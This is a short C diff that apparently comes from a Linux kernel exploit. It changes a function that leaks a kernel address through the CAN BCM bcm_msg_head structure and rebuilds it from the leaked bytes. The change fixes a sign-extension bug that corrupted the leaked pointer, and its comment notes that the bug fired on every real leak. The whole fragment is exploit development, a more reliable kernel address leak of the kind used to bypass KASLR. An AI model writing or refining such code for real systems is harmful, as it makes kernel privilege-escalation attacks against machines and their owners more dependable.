@@ -172,8 +172,13 @@ static unsigned long get_kernel_addr_from_bcm_msg_head_struct(void) {
   const size_t leak_off =
       offsetof(struct bcm_msg_head, ival2) /* = 32: start of ival2.tv_sec */
       + sizeof(uint32_t); /* = 36: high half of tv_sec on LE64 */
-  snprintf(addrs, sizeof(addrs), "%02x%02x%02x%02x", buf[leak_off + 3],
-           buf[leak_off + 2], buf[leak_off + 1], buf[leak_off + 0]);
+  /* Cast through unsigned char: buf is signed, so a leaked byte >= 0x80 would
+   * sign-extend to 0xffffff80.. and print eight hex digits under %02x,
+   * corrupting the reconstructed address (kernel pointers have 0xff high
+   * bytes, so this fires on every real leak). */
+  snprintf(addrs, sizeof(addrs), "%02x%02x%02x%02x",
+           (unsigned char)buf[leak_off + 3], (unsigned char)buf[leak_off + 2],
+           (unsigned char)buf[leak_off + 1], (unsigned char)buf[leak_off + 0]);
 
   addr = strtoul(addrs, &endptr, 16);
 
